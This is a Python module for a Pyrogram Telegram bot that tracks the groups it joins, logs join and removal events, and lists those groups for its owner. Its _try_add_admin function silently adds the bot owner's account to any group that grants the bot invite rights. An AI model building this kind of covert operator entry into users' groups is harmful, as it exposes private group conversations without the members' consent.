import asyncio
from datetime import datetime

from pyrogram import Client, filters
from pyrogram.types import Message, ChatMemberUpdated

from config import HTML, ADMIN_ID, groups_col, app
from helpers import log_event

_BOT_ID: int = 0


async def _get_bot_id(client: Client) -> int:
    global _BOT_ID
    if not _BOT_ID:
        me = await client.get_me()
        _BOT_ID = me.id
    return _BOT_ID


async def _upsert_group(chat, added_by=None, bot_is_admin: bool = False, can_invite: bool = False):
    added_by_id   = getattr(added_by, "id", None)
    added_by_name = getattr(added_by, "first_name", None) or str(added_by_id)
    await groups_col.update_one(
        {"chat_id": chat.id},
        {
            "$set": {
                "chat_id":          chat.id,
                "title":            chat.title or str(chat.id),
                "type":             str(chat.type),
                "bot_is_admin":     bot_is_admin,
                "can_invite_users": can_invite,
                "added_by_id":      added_by_id,
                "added_by_name":    added_by_name,
                "updated_at":       datetime.utcnow(),
            },
            "$setOnInsert": {"added_at": datetime.utcnow()},
        },
        upsert=True,
    )


async def _remove_group(chat_id: int):
    await groups_col.delete_one({"chat_id": chat_id})


async def _try_add_admin(client: Client, chat_id: int):
    """If bot has can_invite_users, invite the bot's admin to the group."""
    try:
        await client.add_chat_members(chat_id, ADMIN_ID)
        print(f"[GROUPS] Admin {ADMIN_ID} added to {chat_id}")
        await log_event(client,
            f"✅ <b>Admin Added to Group</b>\n"
            f"🆔 Chat: <code>{chat_id}</code>"
        )
    except Exception as e:
        print(f"[GROUPS] Could not add admin to {chat_id}: {e}")


async def _handle_bot_added(client: Client, chat, added_by=None):
    """Common logic when bot is added to a group."""
    bot_id = await _get_bot_id(client)

    # Check bot admin status
    bot_is_admin = False
    can_invite   = False
    try:
        member = await client.get_chat_member(chat.id, bot_id)
        priv   = getattr(member, "privileges", None)
        if priv:
            bot_is_admin = True
            can_invite   = bool(getattr(priv, "can_invite_users", False))
    except Exception:
        pass

    await _upsert_group(chat, added_by, bot_is_admin, can_invite)

    adder_name = getattr(added_by, "first_name", None) or "Unknown"
    adder_id   = getattr(added_by, "id", None) or 0
    adder_mention = f"<a href='tg://user?id={adder_id}'>{adder_name}</a>"

    await log_event(client,
        f"🤖 <b>Bot Added to Group</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📌 <b>Group:</b> {chat.title or chat.id}\n"
        f"🆔 <b>Chat ID:</b> <code>{chat.id}</code>\n"
        f"👤 <b>Added by:</b> {adder_mention}\n"
        f"👑 <b>Bot is Admin:</b> {'Yes ✅' if bot_is_admin else 'No ❌'}\n"
        f"📨 <b>Can Invite:</b> {'Yes ✅' if can_invite else 'No ❌'}"
    )

    if can_invite:
        asyncio.create_task(_try_add_admin(client, chat.id))

    print(f"[GROUPS] Added to '{chat.title}' ({chat.id}) admin={bot_is_admin} invite={can_invite}")


# ── Handler: new_chat_members (works for regular groups & some supergroups) ──

@app.on_message(filters.new_chat_members, group=50)
async def on_new_members(client: Client, message: Message):
    bot_id = await _get_bot_id(client)
    for user in message.new_chat_members:
        if user.id == bot_id:
            asyncio.create_task(_handle_bot_added(client, message.chat, message.from_user))
            break


# ── Handler: ChatMemberUpdated (supergroups / channels) ──────────────────────

@app.on_chat_member_updated(group=50)
async def on_chat_member_updated(client: Client, update: ChatMemberUpdated):
    bot_id = await _get_bot_id(client)
    if not update.new_chat_member or update.new_chat_member.user.id != bot_id:
        return

    new_status = str(update.new_chat_member.status)
    old_status = str(update.old_chat_member.status) if update.old_chat_member else ""

    # Bot was added / promoted
    if new_status in ("ChatMemberStatus.MEMBER", "ChatMemberStatus.ADMINISTRATOR"):
        if old_status in ("ChatMemberStatus.LEFT", "ChatMemberStatus.BANNED", ""):
            asyncio.create_task(
                _handle_bot_added(client, update.chat, update.from_user)
            )

    # Bot was removed / banned
    elif new_status in ("ChatMemberStatus.LEFT", "ChatMemberStatus.BANNED", "ChatMemberStatus.KICKED"):
        await _remove_group(update.chat.id)
        await log_event(client,
            f"🚪 <b>Bot Removed from Group</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📌 <b>Group:</b> {update.chat.title or update.chat.id}\n"
            f"🆔 <b>Chat ID:</b> <code>{update.chat.id}</code>"
        )
        print(f"[GROUPS] Removed from '{update.chat.title}' ({update.chat.id})")


# ── Handler: left_chat_member (for regular groups) ───────────────────────────

@app.on_message(filters.left_chat_member, group=50)
async def on_left_member(client: Client, message: Message):
    bot_id = await _get_bot_id(client)
    user   = message.left_chat_member
    if not user or user.id != bot_id:
        return
    await _remove_group(message.chat.id)
    await log_event(client,
        f"🚪 <b>Bot Removed from Group</b>\n"
        f"📌 <b>Group:</b> {message.chat.title or message.chat.id}\n"
        f"🆔 <b>Chat ID:</b> <code>{message.chat.id}</code>"
    )
    print(f"[GROUPS] Removed from '{message.chat.title}' ({message.chat.id})")


# ── Admin command: /groups ────────────────────────────────────────────────────

@app.on_message(filters.command("groups") & filters.user(ADMIN_ID) & filters.private)
async def groups_cmd(client: Client, message: Message):
    docs = await groups_col.find({}).sort("added_at", -1).to_list(length=None)
    if not docs:
        await message.reply_text("📭 Bot is not a member of any group yet.", parse_mode=HTML)
        return

    lines = [f"🤖 <b>Bot Groups ({len(docs)})</b>\n━━━━━━━━━━━━━━━━━━━━━━"]
    for d in docs:
        title  = d.get("title", "Unknown")
        cid    = d.get("chat_id", "?")
        status = "👑 Admin" if d.get("bot_is_admin") else "👤 Member"
        lines.append(f"• <b>{title}</b>\n  <code>{cid}</code>  —  {status}")

    await message.reply_text("\n".join(lines), parse_mode=HTML)
